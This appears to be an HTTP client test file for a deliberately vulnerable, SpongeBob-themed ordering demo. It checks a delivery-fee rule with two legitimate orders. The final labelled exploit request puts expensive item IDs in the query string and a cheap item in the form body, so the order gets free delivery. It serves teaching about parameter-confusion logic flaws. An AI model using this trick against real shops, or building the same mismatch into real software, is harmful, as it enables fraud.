# @import ../common/setup.http
@host = {{base_host}}/v102

# Sandy introduces food delivery service, although it's still limited to the VIP customers.
# Orders now include a delivery address, and a $5 delivery fee is added to orders under $25.

{{
  await seedBalance("v102", "spongebob", 100);
  await seedBalance("v102", "patrick", 100);
  await seedBalance("v102", "plankton", 100);
  console.info("Demo: All actors start with $100 balance");
}}

### Record the cheapest and most expensive items from the menu
GET /menu

@cheap_item = {{response.parsedBody.find(i => parseFloat(i.price) < 10)}}
@expensive_item = {{response.parsedBody.find(i => parseFloat(i.price) > 25)}}

{{
  console.info(`Cheap item: ${cheap_item.name} (\$${cheap_item.price})`);
  console.info(`Expensive item: ${expensive_item.name} (\$${expensive_item.price})`);
}}


### Legitimate Usage: SpongeBob orders cheap delivery, and pays the delivery fee
POST /orders
Authorization: {{spongebob_auth}}
Content-Type: application/x-www-form-urlencoded

items={{cheap_item.id}}&delivery_address=Under the Rock

?? status == 201
?? js response.parsedBody.delivery_fee == 5.00
?? js response.parsedBody.total == {{parseFloat(cheap_item.price) + 5.00}}


### Legitimate Usage: Patrick makes order above $25, so the delivery fee is free.
POST /orders
Authorization: {{patrick_auth}}
Content-Type: application/x-www-form-urlencoded

items={{expensive_item.id}}&delivery_address=Pineapple Under the Sea

?? status == 201
?? js response.parsedBody.delivery_fee == 0.00
?? js response.parsedBody.total == {{parseFloat(expensive_item.price)}}


# --- Exploit: Plankton tries to bypass the delivery fee ---

### Exploit: Plankton tricks the Delivery Fee Calculator
# He puts expensive items in the URL (Query String) to trigger the "Free Delivery > $25" rule.
# But he puts his actual cheap item in the Body (Form Data) to pay less.
# As a result, the delivery fee is $0.00!
POST /orders?items={{expensive_item.id}}&items={{expensive_item.id}}
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

items={{cheap_item.id}}&delivery_address=Chum Bucket

# Verification: Order created for the cheap item, but the Delivery Fee is $0.00!
?? status == 201
?? js response.parsedBody.delivery_fee == 0.00
?? js response.parsedBody.total == {{cheap_item.price}}
